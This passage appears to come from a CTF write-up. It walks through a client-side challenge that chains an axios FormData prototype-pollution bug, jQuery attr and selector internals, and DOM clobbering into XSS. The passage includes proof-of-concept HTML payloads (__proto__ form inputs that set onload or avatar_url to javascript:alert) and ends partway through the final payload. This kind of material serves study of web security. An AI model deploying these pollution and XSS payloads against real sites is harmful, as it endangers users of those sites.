+      <span class="token literal-property property">foo</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'1'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+      <span class="token literal-property property">constructor</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+        <span class="token literal-property property">prototype</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+          <span class="token literal-property property">y</span><span class="token operator">:</span> <span class="token string">'value'</span>
+        <span class="token punctuation">&#125;</span>
+      <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token function">expect</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">.</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toEqual</span><span class="token punctuation">(</span><span class="token keyword">undefined</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">expect</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">.</span>y<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toEqual</span><span class="token punctuation">(</span><span class="token keyword">undefined</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>From the commit, it can be seen that axios has a function called <code>formDataToJSON</code> that converts FormData to JSON, and the conversion code contains a vulnerability that can be exploited through the <code>name</code> parameter for prototype pollution.</p>
+<p>Moving back to the challenge code, there is a part that executes: <code>axios.post(&quot;/search&quot;, $(&quot;#search&quot;).get(0)</code>, so as long as we can control <code>#search</code>, we can control the parameters passed here. It can be seen from the axios source code that the form passed here will eventually be converted to FormData and passed to <code>formDataToJSON</code>.</p>
+<p>Therefore, we can inject a <code>&lt;form&gt;</code> using the <code>name</code> to perform prototype pollution. The next step is to find a gadget, usually starting with objects.</p>
+<p>A suspicious part of the code is:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#homepage"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
+    <span class="token string-property property">"src"</span><span class="token operator">:</span> repo<span class="token punctuation">.</span>homepage<span class="token punctuation">,</span>
+    <span class="token string-property property">"hidden"</span><span class="token operator">:</span> <span class="token boolean">false</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>The parameter passed here is an object, and if the <code>.attr</code> function does not have specific checks, it could be affected by polluted parameters. In fact, in jQuery, the implementation of <a target="_blank" rel="noopener" href="https://github.com/jquery/jquery/blob/3.7.1/src/attributes/attr.js#L16">attr</a> is as follows:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">jQuery<span class="token punctuation">.</span>fn<span class="token punctuation">.</span><span class="token function">extend</span><span class="token punctuation">(</span> <span class="token punctuation">&#123;</span>
+    <span class="token function-variable function">attr</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span> <span class="token parameter">name<span class="token punctuation">,</span> value</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> <span class="token function">access</span><span class="token punctuation">(</span> <span class="token keyword">this</span><span class="token punctuation">,</span> jQuery<span class="token punctuation">.</span>attr<span class="token punctuation">,</span> name<span class="token punctuation">,</span> value<span class="token punctuation">,</span> arguments<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">1</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>The implementation of <a target="_blank" rel="noopener" href="https://github.com/jquery/jquery/blob/main/src/core/access.js#L12">access</a> is:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">access</span><span class="token punctuation">(</span> <span class="token parameter">elems<span class="token punctuation">,</span> fn<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> chainable<span class="token punctuation">,</span> emptyGet<span class="token punctuation">,</span> raw</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>
+        len <span class="token operator">=</span> elems<span class="token punctuation">.</span>length<span class="token punctuation">,</span>
+        bulk <span class="token operator">=</span> key <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
+
+    <span class="token comment">// Sets many values</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">toType</span><span class="token punctuation">(</span> key <span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">"object"</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        chainable <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+        <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token keyword">in</span> key <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token function">access</span><span class="token punctuation">(</span> elems<span class="token punctuation">,</span> fn<span class="token punctuation">,</span> i<span class="token punctuation">,</span> key<span class="token punctuation">[</span> i <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> emptyGet<span class="token punctuation">,</span> raw <span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>If the key passed is an object, it will use <code>in</code> to retrieve each key. Since <code>in</code> retrieves properties on the prototype chain, we can pollute <code>onload</code> to let jQuery set the onload attribute.</p>
+<p>The payload is as follows:</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>search</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>__proto__.onload</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>alert(document.domain)</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>q</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>react-d3</span><span class="token punctuation">></span></span>&lt;
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>It may seem fine, but upon testing, an error occurs:</p>
+<pre class="line-numbers language-none"><code class="language-none">Uncaught (in promise) TypeError: Cannot use &#39;in&#39; operator to search for &#39;set&#39; in alert(document.domain)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>After a while of debugging, it was found that the error originated from this section when setting the <code>attr</code>:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// Attribute hooks are determined by the lowercase version</span>
+<span class="token comment">// Grab necessary hook if one is defined</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span> nType <span class="token operator">!==</span> <span class="token number">1</span> <span class="token operator">||</span> <span class="token operator">!</span>jQuery<span class="token punctuation">.</span><span class="token function">isXMLDoc</span><span class="token punctuation">(</span> elem <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    hooks <span class="token operator">=</span> jQuery<span class="token punctuation">.</span>attrHooks<span class="token punctuation">[</span> name<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">]</span> <span class="token operator">||</span>
+        <span class="token punctuation">(</span> jQuery<span class="token punctuation">.</span>expr<span class="token punctuation">.</span>match<span class="token punctuation">.</span>bool<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span> name <span class="token punctuation">)</span> <span class="token operator">?</span> boolHook <span class="token operator">:</span> <span class="token keyword">undefined</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span> value <span class="token operator">!==</span> <span class="token keyword">undefined</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span> value <span class="token operator">===</span> <span class="token keyword">null</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        jQuery<span class="token punctuation">.</span><span class="token function">removeAttr</span><span class="token punctuation">(</span> elem<span class="token punctuation">,</span> name <span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span> hooks <span class="token operator">&amp;&amp;</span> <span class="token string">"set"</span> <span class="token keyword">in</span> hooks <span class="token operator">&amp;&amp;</span>
+        <span class="token punctuation">(</span> ret <span class="token operator">=</span> hooks<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span> elem<span class="token punctuation">,</span> value<span class="token punctuation">,</span> name <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token keyword">undefined</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> ret<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    elem<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span> name<span class="token punctuation">,</span> value <span class="token operator">+</span> <span class="token string">""</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> value<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>It first executes <code>hooks = jQuery.attrHooks[ name.toLowerCase() ]</code>, since we polluted the <code>onload</code> attribute, <code>jQuery.attrHooks[&#39;onload&#39;]</code> will be a string, making <code>hooks</code> a string as well.</p>
+<p>Next, it reaches <code>&quot;set&quot; in hooks</code>, as strings do not have <code>in</code> to use, hence throwing the error seen earlier.</p>
+<p>Now that we know where the problem lies, the solution is simple. Changing <code>onload</code> to <code>Onload</code> will suffice, as this way <code>name.toLowerCase()</code> will be <code>onload</code>, and <code>jQuery.attrHooks[&#39;onload&#39;]</code> will not exist.</p>
+<p>With this, the issue is resolved. It was much easier than I had imagined, taking about 3-4 hours. Then, I saw the author’s <a target="_blank" rel="noopener" href="https://twitter.com/kevin_mizu/status/1744552795410456756">tweet</a> and realized it was an unintended, explaining why it was less challenging than expected.</p>
+<h2><span id="intended-solution-is-not-that-difficult-as-wellor-is-it">Intended solution is not that difficult as well…or is it?</span></h2><p>Knowing that my solution was unintended, I began to think about what the intended solution might be. The author mentioned in Discord that the intended solution and the current unintended solution used completely different approaches, so it could be assumed that the <code>attr(&#123;&#125;)</code> part was to be excluded, leaving only the remaining code:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">search</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"img.loading"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"hidden"</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    axios<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/search"</span><span class="token punctuation">,</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#search"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
+        <span class="token string-property property">"headers"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token string-property property">"Content-Type"</span><span class="token operator">:</span> <span class="token string">"application/json"</span> <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">d</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"img.loading"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"hidden"</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">const</span> repo <span class="token operator">=</span> d<span class="token punctuation">.</span>data<span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>repo<span class="token punctuation">.</span>owner<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"Not found!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">return</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+
+        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"img.avatar"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"src"</span><span class="token punctuation">,</span> repo<span class="token punctuation">.</span>owner<span class="token punctuation">.</span>avatar_url<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#description"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span>repo<span class="token punctuation">.</span>description<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Within the remaining code, my intuition told me that the focus was on this line:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"img.avatar"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"src"</span><span class="token punctuation">,</span> repo<span class="token punctuation">.</span>owner<span class="token punctuation">.</span>avatar_url<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>If we could use prototype pollution to change <code>$(&quot;img.avatar&quot;)</code> to <code>$(&#39;#homepage&#39;)</code>, selecting that iframe, and then with control over <code>repo.owner.avatar_url</code>, we could set the iframe’s src to <code>javascript:alert(1)</code>, achieving XSS.</p>
+<p>This guess seemed very reasonable, with about a 90% chance of being correct, as using prototype pollution to affect selectors seemed new, at least to me, and it was cool! It also aligned with the author’s tweet: “super interesting.”</p>
+<p>So, I spent some time exploring how selectors work, but the code turned out to be more complex than I had imagined, involving many functions.</p>
+<p>After four to five hours, I finally found a point to exploit.</p>
+<p>When executing <code>$()</code>, it uses <a target="_blank" rel="noopener" href="https://github.com/jquery/jquery/blob/3.7.1/src/selector.js#L197">find</a> to locate the corresponding elements. There is a check for <code>documentIsHTML</code>, and if it is true, it typically uses native APIs like querySelector to search, with no room for manipulation.</p>
+<p>Therefore, we needed to make it false. The code for this check is <a target="_blank" rel="noopener" href="https://github.com/jquery/jquery/blob/3.7.1/src/core.js#L330">here</a>. By making <code>isXMLDoc</code> return true, <code>documentIsHTML</code> will be false:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function-variable function">isXMLDoc</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span> <span class="token parameter">elem</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">var</span> namespace <span class="token operator">=</span> elem <span class="token operator">&amp;&amp;</span> elem<span class="token punctuation">.</span>namespaceURI<span class="token punctuation">,</span>
+        docElem <span class="token operator">=</span> elem <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span> elem<span class="token punctuation">.</span>ownerDocument <span class="token operator">||</span> elem <span class="token punctuation">)</span><span class="token punctuation">.</span>documentElement<span class="token punctuation">;</span>
+
+    <span class="token comment">// Assume HTML when documentElement doesn't yet exist, such as inside</span>
+    <span class="token comment">// document fragments.</span>
+    <span class="token keyword">return</span> <span class="token operator">!</span>rhtmlSuffix<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span> namespace <span class="token operator">||</span> docElem <span class="token operator">&amp;&amp;</span> docElem<span class="token punctuation">.</span>nodeName <span class="token operator">||</span> <span class="token string">"HTML"</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>We can use DOM clobbering to overwrite <code>documentElement</code>, turning <code>docElem</code> into an <code>&lt;img&gt;</code>. This change would invalidate the check and set <code>isXMLDoc</code> to true because <code>documentElement</code> is not <code>&lt;html&gt;</code>.</p>
+<p>After bypassing the check, native APIs were temporarily not used, and the <a target="_blank" rel="noopener" href="https://github.com/jquery/jquery/blob/3.7.1/src/selector.js#L2001">select</a> function was executed, starting with tokenizing the selector:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">tokenize</span><span class="token punctuation">(</span> <span class="token parameter">selector<span class="token punctuation">,</span> parseOnly</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">var</span> matched<span class="token punctuation">,</span> match<span class="token punctuation">,</span> tokens<span class="token punctuation">,</span> type<span class="token punctuation">,</span>
+        soFar<span class="token punctuation">,</span> groups<span class="token punctuation">,</span> preFilters<span class="token punctuation">,</span>
+        cached <span class="token operator">=</span> tokenCache<span class="token punctuation">[</span> selector <span class="token operator">+</span> <span class="token string">" "</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span> cached <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> parseOnly <span class="token operator">?</span> <span class="token number">0</span> <span class="token operator">:</span> cached<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span> <span class="token number">0</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token comment">// ...</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>This seemed to be the target!</p>
+<p>By polluting <code>img.avatar </code>, we could control the <code>tokenCache</code> content, influencing the tokenization result to directly replace it with the iframe we wanted to select.</p>
+<p>It appears the expected solution wasn’t that difficult after all.</p>
+<p>However, after attempting it, it was found to be ineffective.</p>
+<p>The reason it didn’t work was not due to a wrong gadget but rather the prototype pollution aspect. This led to revisiting and studying the axios vulnerability exploit that was previously overlooked.</p>
+<p>Axios works like this when converting the form name to a JSON key, as shown <a target="_blank" rel="noopener" href="https://github.com/axios/axios/blob/v1.6.4/lib/helpers/formDataToJSON.js#L12">here</a>:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">/**
+ * It takes a string like `foo[x][y][z]` and returns an array like `['foo', 'x', 'y', 'z']
+ *
+ * @param &#123;string&#125; name - The name of the property to get.
+ *
+ * @returns An array of strings.
+ */</span>
+<span class="token keyword">function</span> <span class="token function">parsePropPath</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token comment">// foo[x][y][z]</span>
+  <span class="token comment">// foo.x.y.z</span>
+  <span class="token comment">// foo-x-y-z</span>
+  <span class="token comment">// foo x y z</span>
+  <span class="token keyword">return</span> utils<span class="token punctuation">.</span><span class="token function">matchAll</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\w+|\[(\w*)]</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">match</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">return</span> match<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">'[]'</span> <span class="token operator">?</span> <span class="token string">''</span> <span class="token operator">:</span> match<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">||</span> match<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>It treats any characters other than A-Za-z0-9_ as separators, so spaces cannot be part of the property name. I spent three to four hours here and couldn’t find any way to bypass this.</p>
+<p>At this point, I realized I was wrong, this challenge was not that simple…</p>
+<h2><span id="one-of-the-three-most-common-illusions-i-can-solve-it">One of the three most common illusions: I can solve It</span></h2><p>After a day, I continued to look at this challenge. Since I couldn’t use spaces, there must be another way to exploit it. So, I continued to trace how the code works.</p>
+<p>If you keep tracing down, you will reach the function <a target="_blank" rel="noopener" href="https://github.com/jquery/jquery/blob/3.7.1/src/selector.js#L1766">matcherFromTokens</a>. However, the code inside is complex and lengthy. When I first saw it, I thought, “Forget it, I’ll wait for the solution.”</p>
+<p>But after a day, I gathered my spirits and started over. I found a place to pollute before entering tokenize:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">select</span><span class="token punctuation">(</span> <span class="token parameter">selector<span class="token punctuation">,</span> context<span class="token punctuation">,</span> results<span class="token punctuation">,</span> seed</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">var</span> i<span class="token punctuation">,</span> tokens<span class="token punctuation">,</span> token<span class="token punctuation">,</span> type<span class="token punctuation">,</span> find<span class="token punctuation">,</span>
+    compiled <span class="token operator">=</span> <span class="token keyword">typeof</span> selector <span class="token operator">===</span> <span class="token string">"function"</span> <span class="token operator">&amp;&amp;</span> selector<span class="token punctuation">,</span>
+    match <span class="token operator">=</span> <span class="token operator">!</span>seed <span class="token operator">&amp;&amp;</span> <span class="token function">tokenize</span><span class="token punctuation">(</span> <span class="token punctuation">(</span> selector <span class="token operator">=</span> compiled<span class="token punctuation">.</span>selector <span class="token operator">||</span> selector <span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment">// ...</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Here, there is <code>selector = compiled.selector || selector</code>. So, if I pollute <code>selector</code>, I can change the selector arbitrarily.</p>
+<p>Just as I was feeling proud of my cleverness, reality came crashing down on me. After polluting the selector, an error occurred when entering tokenize because this part:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// Filters</span>
+<span class="token keyword">for</span> <span class="token punctuation">(</span> type <span class="token keyword">in</span> filterMatchExpr <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span> match <span class="token operator">=</span> jQuery<span class="token punctuation">.</span>expr<span class="token punctuation">.</span>match<span class="token punctuation">[</span> type <span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span> soFar <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span> <span class="token operator">!</span>preFilters<span class="token punctuation">[</span> type <span class="token punctuation">]</span> <span class="token operator">||</span>
+        <span class="token punctuation">(</span> match <span class="token operator">=</span> preFilters<span class="token punctuation">[</span> type <span class="token punctuation">]</span><span class="token punctuation">(</span> match <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        matched <span class="token operator">=</span> match<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        tokens<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span> <span class="token punctuation">&#123;</span>
+            <span class="token literal-property property">value</span><span class="token operator">:</span> matched<span class="token punctuation">,</span>
+            <span class="token literal-property property">type</span><span class="token operator">:</span> type<span class="token punctuation">,</span>
+            <span class="token literal-property property">matches</span><span class="token operator">:</span> match
+        <span class="token punctuation">&#125;</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+        soFar <span class="token operator">=</span> soFar<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span> matched<span class="token punctuation">.</span>length <span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>By polluting the selector, when executing <code>type in filterMatchExpr</code>, the polluted selector will be retrieved. Then, it proceeds to <code>jQuery.expr.match[type].exec</code>, which causes an error because a string does not have the <code>exec</code> method.</p>
+<p>In other words, no matter what we pollute, once we enter tokenize, an error will occur. Therefore, trying to directly pollute the selector as an iframe is not possible.</p>
+<p>However, we can pollute the selector with something already in the cache, such as <code>img.loading</code>, to bypass the error in tokenize.</p>
+<p>But this only prevents the program from breaking, it still doesn’t solve the challenge.</p>
+<h2><span id="hint-to-the-rescue">Hint to the rescue</span></h2><p>After another day or two, I saw the author’s <a target="_blank" rel="noopener" href="https://twitter.com/kevin_mizu/status/1749740885657755842">hint</a> on Twitter, clearly pointing out that the key was the <code>addCombinator</code> I had previously overlooked due to its complexity. From the hint, it was evident that I was just one step away.</p>
+<p>So, I gritted my teeth for about half a day, traced this part of the code a bit, and finally got the expected answer.</p>
+<p>Here is the final payload:</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>documentElement</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>search<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>__proto__.owner.avatar_url<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>javascript:alert(document.domain)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>__proto__.CLASS.a<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
